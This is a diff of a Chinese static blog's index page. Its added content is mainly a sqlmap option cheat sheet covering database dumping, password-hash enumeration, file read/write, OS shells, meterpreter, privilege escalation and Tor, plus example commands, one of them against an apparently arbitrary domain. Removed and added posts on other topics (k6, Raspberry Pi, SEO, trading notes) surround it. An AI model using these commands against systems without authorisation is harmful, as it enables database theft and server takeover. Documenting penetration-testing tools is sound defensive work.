+	#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）
+</p>
+<h2 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	sqlmap详细命令：
+</h2>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--is-dba 当前用户权限（是否为root权限）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--dbs 所有数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--current-db 网站当前数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--users 所有数据库用户
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--current-user 当前数据库用户
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--random-agent 构造随机user-agent
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--passwords 数据库密码
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--proxy http://local:8080 --threads 10 (可以自定义线程加速) 代理
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
+	</li>
 </ul>
-<p>k6 没有使用 nodejs 而是 golang 程序，通过包裹了一个 JavaScript 运行时来运行 JavaScript 脚本，因此不能直接使用 npm 包以及 Nodejs 提供的一些 API。</p>
-<p>同时，k6 在运行测试时，没有启动浏览器，主要用于测试页面以及 API 加载速度。k6 提供了通过网络请求（HAR）生成测试脚本的方法，实现更简便的测试脚本编写，以及 session 的维护。</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	——————————————————————————————————
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Options（选项）：
+</h3>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--version 显示程序的版本号并退出
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-h, --help 显示此帮助消息并退出
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-v VERBOSE 详细级别：0-6（默认为1）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		保存进度继续跑：
+	</li>
+</ul>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<span style="color:#444444;">sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” 保存进度</span><br style="color:#444444;" />
+<span style="color:#444444;">sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” –resume 恢复已保存进度</span>
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Target（目标）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	以下至少需要设置其中一个选项，设置目标URL。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-d DIRECT 直接连接到数据库。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-u URL, --url=URL 目标URL。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-l LIST 从Burp或WebScarab代理的日志中解析目标。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-r REQUESTFILE 从一个文件中载入HTTP请求。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-g GOOGLEDORK 处理Google dork的结果作为目标URL。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-c CONFIGFILE 从INI配置文件中加载选项。
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Request（请求）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用来指定如何连接到目标URL。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--data=DATA 通过POST发送的数据字符串
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--cookie=COOKIE HTTP Cookie头
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--cookie-urlencode URL 编码生成的cookie注入
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--drop-set-cookie 忽略响应的Set - Cookie头信息
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--user-agent=AGENT 指定 HTTP User - Agent头
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--random-agent 使用随机选定的HTTP User - Agent头
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--referer=REFERER 指定 HTTP Referer头
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--headers=HEADERS 换行分开，加入其他的HTTP头
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--auth-cred=ACRED HTTP身份验证凭据（用户名:密码）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--auth-cert=ACERT HTTP认证证书（key_file，cert_file）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--proxy=PROXY 使用HTTP代理连接到目标URL
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--ignore-proxy 忽略系统默认的HTTP代理
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--timeout=TIMEOUT 等待连接超时的时间（默认为30秒）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--retries=RETRIES 连接超时后重新连接的时间（默认3）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--safe-url=SAFURL 在测试过程中经常访问的url地址
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Enumeration（枚举）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行<br />
+您自己的SQL语句。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-b, --banner 检索数据库管理系统的标识
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--current-user 检索数据库管理系统当前用户
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--current-db 检索数据库管理系统当前数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--is-dba 检测DBMS当前用户是否DBA
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--users 枚举数据库管理系统用户
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--passwords 枚举数据库管理系统用户密码哈希
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--privileges 枚举数据库管理系统用户的权限
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--roles 枚举数据库管理系统用户的角色
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--dbs 枚举数据库管理系统数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-D DBname 要进行枚举的指定数据库名
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-T TBLname 要进行枚举的指定数据库表（如：-T tablename --columns）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--tables 枚举的DBMS数据库中的表
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--columns 枚举DBMS数据库表列
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--dump 转储数据库管理系统的数据库中的表项
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--dump-all 转储所有的DBMS数据库表中的条目
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--search 搜索列（S），表（S）和/或数据库名称（S）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-C COL 要进行枚举的数据库列
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-U USER 用来进行枚举的数据库用户
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--exclude-sysdbs 枚举表时排除系统数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--start=LIMITSTART 第一个查询输出进入检索
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--stop=LIMITSTOP 最后查询的输出进入检索
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--first=FIRSTCHAR 第一个查询输出字的字符检索
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--last=LASTCHAR 最后查询的输出字字符检索
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--sql-query=QUERY 要执行的SQL语句
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--sql-shell 提示交互式SQL的shell
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Optimization（优化）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可用于优化SqlMap的性能。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-o 开启所有优化开关
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--predict-output 预测常见的查询输出
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--keep-alive 使用持久的HTTP（S）连接
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--null-connection 从没有实际的HTTP响应体中检索页面长度
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--threads=THREADS 最大的HTTP（S）请求并发量（默认为1）
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Injection（注入）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-p TESTPARAMETER 可测试的参数（S）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--dbms=DBMS 强制后端的DBMS为此值
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os=OS 强制后端的DBMS操作系统为这个值
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--prefix=PREFIX 注入payload字符串前缀
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--suffix=SUFFIX 注入payload字符串后缀
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--tamper=TAMPER 使用给定的脚本（S）篡改注入数据
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Detection（检测）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--level=LEVEL 执行测试的等级（1-5，默认为1）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--risk=RISK 执行测试的风险（0-3，默认为1）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--string=STRING 查询时有效时在页面匹配字符串
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--regexp=REGEXP 查询时有效时在页面匹配正则表达式
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--text-only 仅基于在文本内容比较网页
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Techniques（技巧）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可用于调整具体的SQL注入测试。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--technique=TECH SQL注入技术测试（默认BEUST）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--union-cols=UCOLS 定列范围用于测试UNION查询注入
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--union-char=UCHAR 用于暴力猜解列数的字符
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Fingerprint（指纹）：
+</h3>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-f, --fingerprint 执行检查广泛的DBMS版本指纹
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Brute force（蛮力）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以被用来运行蛮力检查。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--common-tables 检查存在共同表
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--common-columns 检查存在共同列
+	</li>
+</ul>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	User-defined function injection（用户自定义函数注入）：<br />
+这些选项可以用来创建用户自定义函数。
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	--udf-inject 注入用户自定义函数<br />
+--shared-lib=SHLIB 共享库的本地路径
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	File system access（访问文件系统）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以被用来访问后端数据库管理系统的底层文件系统。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--file-read=RFILE 从后端的数据库管理系统文件系统读取文件
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Operating system access（操作系统访问）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用于访问后端数据库管理系统的底层操作系统。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os-cmd=OSCMD 执行操作系统命令
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os-shell 交互式的操作系统的shell
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os-pwn 获取一个OOB shell，meterpreter或VNC
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os-smbrelay 一键获取一个OOB shell，meterpreter或VNC
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os-bof 存储过程缓冲区溢出利用
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--priv-esc 数据库进程用户权限提升
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--msf-path=MSFPATH Metasploit Framework本地的安装路径
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--tmp-path=TMPPATH 远程临时文件目录的绝对路径
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Windows注册表访问：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以被用来访问后端数据库管理系统Windows注册表。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-read 读一个Windows注册表项值
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-add 写一个Windows注册表项值数据
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-del 删除Windows注册表键值
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-key=REGKEY Windows注册表键
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-value=REGVAL Windows注册表项值
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-data=REGDATA Windows注册表键值数据
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-type=REGTYPE Windows注册表项值类型
+	</li>
+</ul>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用来设置一些一般的工作参数。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-s SESSIONFILE 保存和恢复检索会话文件的所有数据
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--flush-session 刷新当前目标的会话文件
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--fresh-queries 忽略在会话文件中存储的查询结果
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--eta 显示每个输出的预计到达时间
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--update 更新SqlMap
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--save file保存选项到INI配置文件
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--batch 从不询问用户输入，使用所有默认配置。
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Miscellaneous（杂项）：
+</h3>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--beep 发现SQL注入时提醒
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--check-payload IDS对注入payloads的检测测试
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--cleanup SqlMap具体的UDF和表清理DBMS
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--forms 对目标URL的解析和测试形式
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--page-rank Google dork结果显示网页排名（PR）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--parse-errors 从响应页面解析数据库管理系统的错误消息
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--replicate 复制转储的数据到一个sqlite3数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--wizard 给初级用户的简单向导界面
+	</li>
+</ul>
+
+<p>
+	sqlmap-u http://testphp.vulnweb.com/listproducts.php?cat=1
+</p>
+<p>
+	sqlmap-master\sqlmap.py -u &nbsp;"http://www.ddd.com/index?d=55" --batch --banner
+</p>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/164608.html">https://www.freebuf.com/sectool/164608.html</a></p>
 
         </div>
     
@@ -897,8 +987,8 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2025/05/28/raspberry-pi/">
-                Raspberry Pi 树莓派
+            <a href="/2025/05/28/stock/">
+                股市币市
             </a>
         </h1>
         <div class="post-info">
@@ -908,7 +998,7 @@
             
             
                 <span class="category">
-                    <a href="/categories/单片机/">单片机</a>
+                    <a href="/categories/新/">新</a>
                 </span>
             
         </div>
@@ -916,87 +1006,24 @@
 
     
         <div class="content">
-            <p>树莓派的开发探索-基本篇 环境基于(Raspberry Pi OS)</p>
-<h2 id="单片机开发与探索"><a href="#单片机开发与探索" class="headerlink" title="单片机开发与探索"></a>单片机开发与探索</h2><h3 id="无需显示器连WIFI"><a href="#无需显示器连WIFI" class="headerlink" title="无需显示器连WIFI"></a>无需显示器连WIFI</h3><blockquote>
-<p>树莓派系统连接原理</p>
-<blockquote>
-<p>用户可以在未启动树莓派的状态下单独修改 <code>/boot/wpa_supplicant.conf</code> 文件配置 WiFi 的 SSID 和密码，这样树莓派启动后会自行读取 <code>wpa_supplicant.conf</code> 配置文件连接 WiFi 设备。</p>
-</blockquote>
-</blockquote>
-<ul>
-<li><p>制作树莓派系统(Raspberry Pi OS)在sd里面不多赘述</p>
-</li>
-<li><p>在电脑中打开sd卡根目录创建名字为wpa_supplicant.conf 的文件</p>
-</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev</span><br><span class="line">update_config=1</span><br><span class="line">network=&#123;</span><br><span class="line">	ssid=<span class="string">&quot;12345678&quot;</span></span><br><span class="line">	psk=<span class="string">&quot;88888888&quot;</span></span><br><span class="line">	key_mgmt=WPA-PSK</span><br><span class="line">	priority=1  <span class="comment"># 连接优先级，数字越大优先级越高（不可以是负数）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>开机启动树莓派即可连接WIFI</li>
-</ul>
-<h3 id=""><a href="#" class="headerlink" title=""></a></h3>
-        </div>
-    
+            <p>本金 </p>
+<p>三折最多</p>
+<p>三折以上就是突发状况</p>
+<p>有信心可以all in 30%</p>
+<pre><code>信心一般可以先 20%
+</code></pre>
+<p>小试牛刀 10% </p>
+<pre><code>补刀 10%
 
-</div>
-            
-                
-<div class="post">
+    收回本金 cl 1
+    或者收回补刀的钱 cl 2
 
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2025/05/28/redis/">
-                Redis
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2025-05-28</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/数据库/">数据库</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2025/05/28/selenium/">
-                Selenium
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2025-05-28</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/Python/">Python</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h3 id="Selenium-需要配件"><a href="#Selenium-需要配件" class="headerlink" title="Selenium 需要配件"></a>Selenium 需要配件</h3><ul>
-<li>ChromeDriver(记住增加执行权限)</li>
-<li>python pip</li>
-</ul>
+开始做空
+</code></pre>
+<p>一定要留补仓 40%</p>
+<p>本金越大 补仓率就要增高</p>
+<p>2&#x2F;24</p>
+<p>2684 200</p>
 
         </div>
     
@@ -1008,51 +1035,8 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2025/05/28/seo/">
-                SEO
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2025-05-28</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/SEO/">SEO</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="seo工具"><a href="#seo工具" class="headerlink" title="seo工具"></a>seo工具</h1><p>semrush - 好用</p>
-<h1 id="需要做的工作"><a href="#需要做的工作" class="headerlink" title="需要做的工作"></a>需要做的工作</h1><ul>
-<li>静态网站是最好的</li>
-<li>每个页面的title，description 要不一样 <ul>
-<li>title 要大于10个字以上的才行</li>
-</ul>
-</li>
-<li>404不能出现</li>
-<li><a href="https://example.com" rel="nofollow">点我</a> <ul>
-<li>nofollow - 不传权重、不跟踪(外链用)</li>
-</ul>
-</li>
-</ul>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2025/05/28/shell/">
-                Shell
+            <a href="/2025/05/28/system-migration/">
+                系统迁移
             </a>
         </h1>
         <div class="post-info">
@@ -1070,34 +1054,12 @@
 
     
         <div class="content">
-            <ul>
-<li>bash - UNIX shell 目的是作为 Bourne Shell (sh) 的免费软件替代品 (Bash 是 Linus Torvalds（Linux 的创建者）移植到 Linux 的首批程序之一)</li>
-<li>Z shell - 一个与 Bash 非常相似的 UNIX shell,Zsh 是 Bourne shell 的扩展</li>
